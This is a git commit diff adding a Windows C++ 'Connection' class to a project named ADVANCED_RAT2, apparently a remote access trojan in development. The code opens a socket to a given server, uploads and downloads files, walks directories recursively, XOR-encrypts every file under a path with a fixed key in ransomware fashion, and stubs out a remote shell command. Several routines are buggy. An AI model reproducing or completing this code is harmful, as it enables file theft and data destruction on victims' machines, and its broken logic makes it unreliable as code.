cb79f8eaaf7a134714e919b9ddd707b62a8f0116
yehonatan1 <avitantan@gmail.com>
2020-08-08 01:31:19 -0700

    Connection.cpp

--- Connection.cpp
+++ Connection.cpp
@@ -3,3 +3,141 @@
 //
 
 #include "Connection.h"
+
+
+Connection::Connection(string ip, unsigned int port) {
+    Connection::ip = ip;
+    Connection::port = port;
+
+    WSADATA wsadata;
+    WORD ver = MAKEWORD(2, 2);
+    int wResult = WSAStartup(ver, &wsadata);
+
+    if (wResult != 0) {
+        cerr << "Cant start Winsock" << endl;
+        return;
+    }
+
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock == INVALID_SOCKET) {
+        cerr << "Cant create socket" << WSAGetLastError << endl;
+        WSACleanup();
+        return;
+    }
+    sockaddr_in hint;
+    hint.sin_family = AF_INET;
+    hint.sin_port = htons(port);
+    inet_pton(AF_INET, ip.c_str(), &hint.sin_addr);
+
+    int connectionResult = connect(sock, (sockaddr *) &hint, sizeof(hint));
+
+    if (connectionResult == INVALID_SOCKET) {
+        cerr << "Cant connect to server" << WSAGetLastError << endl;
+        closesocket(sock);
+        WSACleanup();
+        return;
+    }
+}
+
+void Connection::sendMessage(string message) {
+    send(sock, message.c_str(), message.size(), 0);
+    return;
+}
+
+
+void Connection::sendFile(string path) {
+    ifstream file{path, ifstream::binary};
+    unique_ptr<vector<char>> buffer = make_unique<vector<char>>(BufferSize + 1, 0);
+
+    while (!file.eof()) {
+        file.read(buffer->data(), BufferSize);
+        send(sock, buffer->data(), static_cast<int>(sizeof(file.gcount())), 0);
+    }
+    file.close();
+    return;
+}
+
+void Connection::recvFile(string path) {
+    ofstream file(path, fstream::binary);
+    unique_ptr<vector<char>> buffer = make_unique<vector<char>>(BufferSize + 1, 0);
+    int size;
+
+    while (true) {
+        size = recv(sock, buffer->data(), BufferSize, 0);
+        if (!buffer->data() || size < 1024) {
+            file.write(buffer->data(), size);
+            file.flush();
+            file.close();
+            break;
+        }
+        file.write(buffer->data(), size);
+    }
+    return;
+}
+
+vector<filesystem::path> &Connection::getAllFiles(string path, vector<filesystem::path> files) {
+
+
+    for (filesystem::directory_entry file : filesystem::recursive_directory_iterator(path)) {
+        files.push_back(file.path());
+    }
+    return files;
+}
+
+string Connection::readFile(filesystem::path path) {
+    ifstream file{path.string(), ifstream::binary};
+    unique_ptr<vector<char>> buffer = make_unique<vector<char>>(BufferSize + 1, 0);
+
+    while (!file.eof()) {
+        file.read(buffer->data(), BufferSize);
+        send(sock, buffer->data(), static_cast<int>(sizeof(file.gcount())), 0);
+    }
+    file.close();
+    return buffer->data();
+}
+
+void Connection::writeToFile(string path, auto &data) {
+    ofstream file{path, ofstream::binary};
+    file.write(data, sizeof(data));
+    file.flush();
+    file.close();
+    return;
+}
+
+string Connection::encryptData(string &data, string key) {
+
+    if (key.size() < data.size()) {
+        for (int i = 0; i < data.size(); i++) {
+            key += key.at(i);
+            if (key.size() == data.size()) {
+                break;
+            }
+        }
+    }
+    string newData = "";
+    for (int i = 0; i < data.size(); i++) {
+        newData += char(int(data.at(i)) ^ int(key.at(i)));
+    }
+    return newData;
+}
+
+void Connection::encryptFiles(string path) {
+    getAllFiles(path, *files);
+    for (int i = 0; i < files->size(); i++) {
+        encryptData(readFile(files->at(i)), "Test");
+    }
+}
+
+
+void Connection::executeShell(string shell) {
+
+
+}
+
+
+
+
+
+
+
+
--- Connection.h
+++ Connection.h
@@ -5,8 +5,68 @@
 #ifndef ADVANCED_RAT2_CONNECTION_H
 #define ADVANCED_RAT2_CONNECTION_H
 
+#include <iostream>
+#include <string>
+#include <WS2tcpip.h>
+#include <vector>
+#include <memory>
+#include <fstream>
+#include <windows.h>
+#include<algorithm>
+#include <filesystem>
+
+
+#define BufferSize 1024
+
+
+#pragma warning(disable:4996)
+
+#pragma comment(lib, "ws2_32.lib")
+
+
+using namespace std;
+
 
 class Connection {
+    string ip;
+    int port;
+    vector<filesystem::path> *files;
+    SOCKET sock;
+
+    //Initialize ip and string
+    Connection(string ip, unsigned int port);
+
+    //Sending the file in path to the server
+    void sendFile(string path);
+
+    //Getting file from the server and save it in path
+    void recvFile(string path);
+
+    //Sending message to the server
+    void sendMessage(string message);
+
+    //Getting command from the server
+    void executeShell(string shell);
+
+    //Saving all files in path
+    vector<filesystem::path> &getAllFiles(string path, vector<filesystem::path> files);
+
+    //Encrypt data with xor encryption with key
+    string encryptData(string &data, string key);
+
+    //Encrypt all the files in path with xor
+    void encryptFiles(string path);
+
+    //Read file in path
+    string readFile(filesystem::path path);
+
+    //Write data to a file in path
+    void writeToFile(string path, auto &data);
+
+
+    //Creating the connection
+    void connection(SOCKET socket);
+
 
 };
 
